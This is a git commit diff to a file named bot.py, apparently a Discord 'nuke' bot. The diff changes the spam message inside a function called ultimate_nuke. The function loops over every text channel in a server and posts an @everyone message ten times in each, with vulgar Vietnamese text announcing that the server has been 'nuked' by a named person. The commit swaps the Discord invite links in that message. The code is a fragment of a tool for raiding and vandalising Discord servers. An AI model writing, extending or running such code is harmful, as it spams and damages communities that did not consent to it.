a90a1514f58445ec7271be3d611a6cc01afd9b0b
daosy686-source <daosy686@gmail.com>
2026-08-13 10:45:14 +0700

    Update bot.py

--- bot.py
+++ bot.py
@@ -917,7 +917,7 @@ async def ultimate_nuke(ctx):
         except:
             pass
 
-        spam_content = "@everyone # SEVER ÓC CẶC ĐÃ BỊ NUKE BỞI BẢO ĐZ\nlink sv: https://discord.gg/2FKg4SugY"
+        spam_content = "@everyone # SEVER ÓC CẶC ĐÃ BỊ NUKE BỞI BẢO ĐZ\nlink sv: https://discord.gg/4jWeG2ag2D\nlink sv:https://discord.gg/fZhYhKdVrY"
         for channel in ctx.guild.text_channels:
             try:
                 for _ in range(10):
